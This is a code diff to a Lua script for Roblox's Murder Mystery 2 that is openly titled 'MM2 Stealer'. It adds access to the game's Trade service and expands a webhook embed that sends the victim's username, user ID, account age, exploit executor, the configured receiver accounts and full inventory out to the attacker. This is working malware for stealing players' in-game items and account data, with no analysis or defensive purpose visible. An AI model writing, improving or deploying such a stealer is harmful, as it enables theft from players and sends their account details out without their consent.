@@ -18,6 +18,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Trade = ReplicatedStorage.Trade
 local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 
 local Inventory = {}
@@ -105,7 +106,7 @@ local success, errorMsg = pcall(function()
         embeds = {
             {
                 title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
-                description = ""```\n🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
+                description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```" .. FullInventory() .. "```",
                 color = tonumber(0x3365FF),
             }
         }
